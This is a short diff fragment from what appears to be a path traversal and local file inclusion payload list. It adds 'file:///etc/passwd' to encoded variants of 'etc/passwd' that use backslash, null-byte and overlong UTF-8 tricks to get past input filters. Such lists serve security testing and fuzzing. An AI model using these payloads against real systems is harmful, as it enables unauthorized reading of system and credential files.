@@ -6,3 +6,4 @@ etc%5cpasswd
 etc%5cpasswd%00
 etc%c0%afpasswd
 etc%c0%afpasswd%00
+file:///etc/passwd
